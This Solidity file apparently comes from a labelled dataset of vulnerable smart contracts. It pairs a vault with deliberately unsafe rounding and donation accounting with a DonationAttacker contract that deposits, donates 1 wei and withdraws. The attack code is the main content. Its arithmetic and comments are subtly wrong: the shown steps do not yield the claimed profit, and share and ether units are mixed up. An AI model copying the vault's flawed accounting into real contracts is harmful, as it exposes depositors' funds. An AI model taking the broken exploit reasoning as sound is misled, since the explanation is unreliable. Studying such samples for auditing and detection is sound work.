// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Vault Donation Attack (Rounding Exploit)
 * @notice BASELINE: Profit from donation + rounding
 * @dev VULNERABLE: Attacker donates to profit from rounding errors
 *
 * ATTACK VECTOR:
 * 1. Alice has 100 shares, Bob has 100 shares (200 total)
 * 2. Attacker donates 1 wei
 * 3. Due to rounding, attacker's share value increases
 * 4. Attacker withdraws for profit
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: false
 * - Immunefi Level: 3 (Medium)
 * - Tags: ["erc4626", "rounding", "donation-attack"]
 */
contract VaultDonationVulnerable {
    uint256 public totalAssets;
    uint256 public totalShares;

    mapping(address => uint256) public sharesOf;

    event Deposit(address user, uint256 assets, uint256 shares);
    event Withdraw(address user, uint256 assets, uint256 shares);

    function deposit(uint256 assets) public payable returns (uint256 shares) {
        require(msg.value == assets);

        if (totalShares == 0) {
            shares = assets;
        } else {
            // VULNERABLE: Integer division rounds down
            shares = (assets * totalShares) / totalAssets;
        }

        require(shares > 0);

        totalAssets += assets;
        totalShares += shares;
        sharesOf[msg.sender] += shares;

        emit Deposit(msg.sender, assets, shares);
    }

    function withdraw(uint256 shares) public returns (uint256 assets) {
        require(sharesOf[msg.sender] >= shares);

        // VULNERABLE: Rounding can give attacker extra assets
        assets = (shares * totalAssets) / totalShares;

        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        totalAssets -= assets;

        payable(msg.sender).transfer(assets);

        emit Withdraw(msg.sender, assets, shares);
    }

    // Direct transfer to vault (donation)
    receive() external payable {
        totalAssets += msg.value;
    }
}

/**
 * @title Donation Attacker
 * @notice Exploits rounding by strategic donations
 */
contract DonationAttacker {
    VaultDonationVulnerable public vault;

    constructor(address _vault) {
        vault = VaultDonationVulnerable(_vault);
    }

    /**
     * @notice Execute donation attack
     * Assumes vault has: 200 shares, 200 assets (1:1 ratio)
     */
    function attack() public payable {
        // Step 1: Deposit to get shares
        vault.deposit{value: 100 ether}(100 ether);
        // Now have: 100 shares, vault has 300 shares / 300 assets

        // Step 2: Donate small amount
        payable(address(vault)).transfer(1 wei);
        // Now: 300 shares / 300.000000000000000001 assets

        // Step 3: Withdraw
        // assets = (100 * 300000000000000000001) / 300
        // Due to rounding, may get slightly more than deposited
        vault.withdraw(100 ether);

        // Profit from rounding!
    }
}